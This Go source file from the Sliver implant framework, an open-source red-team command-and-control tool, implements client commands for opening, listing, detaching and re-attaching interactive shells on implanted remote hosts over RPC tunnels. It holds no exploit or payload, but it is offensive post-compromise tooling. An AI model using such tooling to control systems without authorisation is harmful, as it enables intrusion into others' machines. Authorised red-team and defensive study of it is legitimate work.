package shell

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"io"
	"log"
	"os"
	"strconv"
	"time"

	"github.com/bishopfox/sliver/client/command/settings"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/jedib0t/go-pretty/v6/table"
	"github.com/spf13/cobra"
	"golang.org/x/term"
)

const (
	darwin = "darwin"
	linux  = "linux"
)

type shellResult int

const (
	shellExited shellResult = iota
	shellDetached
	shellAttachFailed
)

// ShellCmd - Start an interactive shell on the remote system.
func ShellCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	if !settings.IsUserAnAdult(con) {
		return
	}

	shellPath, _ := cmd.Flags().GetString("shell-path")
	noPty, _ := cmd.Flags().GetBool("no-pty")
	if con.ActiveTarget.GetSession().OS != linux && con.ActiveTarget.GetSession().OS != darwin {
		noPty = true // Sliver's PTYs are only supported on linux/darwin
	}

	result := runInteractive(cmd, shellPath, noPty, con, nil)
	if result == shellDetached {
		con.Println("Shell detached")
	} else if result == shellExited {
		con.Println("Shell exited")
	}
}

// ShellLsCmd lists local shell tunnels currently managed by the client.
func ShellLsCmd(_ *cobra.Command, con *console.SliverClient, _ []string) {
	managed := shells.List()
	if len(managed) == 0 {
		con.PrintInfof("No managed shells\n")
		return
	}

	tw := table.NewWriter()
	tw.SetStyle(settings.GetTableStyle(con))
	tw.AppendHeader(table.Row{
		"ID",
		"State",
		"Session",
		"PID",
		"PTY",
		"Tunnel ID",
		"Path",
		"Age",
	})

	now := time.Now()
	for _, sh := range managed {
		age := now.Sub(sh.CreatedAt).Round(time.Second).String()
		if sh.CreatedAt.IsZero() {
			age = "-"
		}
		pid := "-"
		if sh.Pid > 0 {
			pid = strconv.FormatUint(uint64(sh.Pid), 10)
		}

		tw.AppendRow(table.Row{
			sh.ID,
			sh.State(),
			sessionLabel(sh.SessionID, sh.SessionName),
			pid,
			sh.EnablePTY,
			sh.TunnelID,
			sh.Path,
			age,
		})
	}

	con.Printf("%s\n", tw.Render())
}

// ShellAttachCmd re-attaches local stdin/stdout to a managed shell tunnel.
func ShellAttachCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	if len(args) < 1 {
		con.PrintErrorf("Usage: shell attach <id>\n")
		return
	}

	shellID, err := strconv.Atoi(args[0])
	if err != nil || shellID <= 0 {
		con.PrintErrorf("Invalid shell id: %s\n", args[0])
		return
	}

	sh, ok := shells.Get(shellID)
	if !ok {
		con.PrintErrorf("Unknown shell id: %d\n", shellID)
		return
	}
	if sh.State() == shellStateAttached {
		con.PrintErrorf("Shell %d is already attached\n", shellID)
		return
	}
	if sh.State() == shellStateClosing {
		con.PrintErrorf("Shell %d is closing\n", shellID)
		return
	}
	tunnel := sh.Tunnel()
	if tunnel == nil || !tunnel.IsOpen() {
		con.PrintErrorf("Shell %d is no longer active\n", shellID)
		shells.Remove(shellID)
		return
	}

	session := con.ActiveTarget.GetSession()
	if session == nil || session.ID != sh.SessionID {
		con.PrintErrorf("Shell %d belongs to %s; switch targets before attaching\n", shellID, sessionLabel(sh.SessionID, sh.SessionName))
		return
	}

	result := runInteractive(cmd, sh.Path, !sh.EnablePTY, con, sh)
	if result == shellDetached {
		con.Println("Shell detached")
	} else if result == shellExited {
		con.Println("Shell exited")
	}
}

func runInteractive(cmd *cobra.Command, shellPath string, noPty bool, con *console.SliverClient, existing *managedShell) shellResult {
	con.Println()
	con.PrintInfof("Shell management: `shell ls`, `shell attach <id>`\n")
	con.PrintInfof("Escape: press Ctrl-] to return to the Sliver client\n")

	session := con.ActiveTarget.GetSession()
	if session == nil {
		return shellAttachFailed
	}

	if existing == nil {
		con.PrintInfof("Opening shell tunnel ...\n\n")
	} else {
		con.PrintInfof("Re-attaching to shell %d ...\n\n", existing.ID)
	}

	var (
		tunnel      *core.TunnelIO
		managed     *managedShell
		enablePTY   bool
		oldState    *term.State
		stateSaved  bool
		stopPtySize = func() {}
		err         error
	)

	if existing == nil {
		// Create an RPC tunnel, then start it before binding the shell to the newly created tunnel.
		ctxTunnel, cancelTunnel := context.WithCancel(context.Background())
		defer cancelTunnel()

		rpcTunnel, err := con.Rpc.CreateTunnel(ctxTunnel, &sliverpb.Tunnel{
			SessionID: session.ID,
		})
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return shellAttachFailed
		}
		log.Printf("Created new tunnel with id: %d, binding to shell ...", rpcTunnel.TunnelID)

		// Start() takes an RPC tunnel and creates a local Reader/Writer tunnel object.
		tunnel = core.GetTunnels().Start(rpcTunnel.TunnelID, rpcTunnel.SessionID)

		var rows uint32
		var cols uint32
		if !noPty {
			colsInt, rowsInt, err := term.GetSize(int(os.Stdout.Fd()))
			if err != nil || rowsInt <= 0 || colsInt <= 0 {
				colsInt, rowsInt, err = term.GetSize(int(os.Stdin.Fd()))
			}
			if err == nil && rowsInt > 0 && colsInt > 0 {
				rows = uint32(rowsInt)
				cols = uint32(colsInt)
			}
		}

		shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
			Request:   con.ActiveTarget.Request(cmd),
			Path:      shellPath,
			EnablePTY: !noPty,
			Rows:      rows,
			Cols:      cols,
			TunnelID:  tunnel.ID,
		})
		if err != nil {
			con.PrintErrorf("%s\n", err)
			core.GetTunnels().Close(tunnel.ID)
			return shellAttachFailed
		}
		if shell.Response != nil && shell.Response.Err != "" {
			con.PrintErrorf("Error: %s\n", shell.Response.Err)
			go backgroundCloseShell(con, tunnel.ID, session.ID)
			return shellAttachFailed
		}

		path := shellPath
		if path == "" {
			path = shell.Path
		}
		enablePTY = !noPty
		managed = &managedShell{
			SessionID:   session.ID,
			SessionName: session.Name,
			Path:        path,
			Pid:         shell.Pid,
			TunnelID:    tunnel.ID,
			EnablePTY:   enablePTY,
			CreatedAt:   time.Now(),
			state:       shellStateAttached,
			tunnel:      tunnel,
			output:      newSwapWriter(os.Stdout),
		}
		managed.ID = shells.Add(managed)
		managed.startReader(func() {
			shells.Remove(managed.ID)
		})

		log.Printf("Bound remote shell pid %d to tunnel %d", shell.Pid, shell.TunnelID)
		con.PrintInfof("Started remote shell [%d] with pid %d\n\n", managed.ID, shell.Pid)
	} else {
		managed = existing
		tunnel = managed.Tunnel()
		enablePTY = managed.EnablePTY
		managed.setState(shellStateAttached)
		managed.SetOutput(os.Stdout)
		con.PrintInfof("Attached shell [%d] (pid %d)\n\n", managed.ID, managed.Pid)
	}

	if enablePTY {
		oldState, err = term.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			con.PrintErrorf("Failed to save terminal state\n")
			managed.SetOutput(io.Discard)
			managed.setState(shellStateDetached)
			return shellAttachFailed
		}
		stateSaved = true
		stopPtySize = startPtyResizeWatcher(con, cmd, tunnel.ID)
	}
	defer stopPtySize()

	if stateSaved {
		defer func() {
			log.Printf("Restoring terminal state ...")
			term.Restore(0, oldState)
		}()
	}

	detached, _ := runAttachedIO(tunnel, con)
	if detached {
		managed.SetOutput(io.Discard)
		managed.setState(shellStateDetached)
		return shellDetached
	}

	managed.SetOutput(io.Discard)
	managed.setState(shellStateClosing)
	shells.Remove(managed.ID)

	// "exit" should return immediately; tunnel close/cleanup is best-effort in the background.
	go backgroundCloseShell(con, tunnel.ID, session.ID)

	return shellExited
}

func backgroundCloseShell(con *console.SliverClient, tunnelID uint64, sessionID string) {
	core.GetTunnels().Close(tunnelID)
	if con == nil || con.Rpc == nil {
		return
	}

	_, err := con.Rpc.CloseTunnel(context.Background(), &sliverpb.Tunnel{
		TunnelID:  tunnelID,
		SessionID: sessionID,
	})
	if err != nil {
		log.Printf("Background close tunnel %d failed: %v", tunnelID, err)
	}
}

func sessionLabel(sessionID, sessionName string) string {
	if sessionName == "" {
		return sessionID
	}
	return sessionName + " (" + sessionID + ")"
}
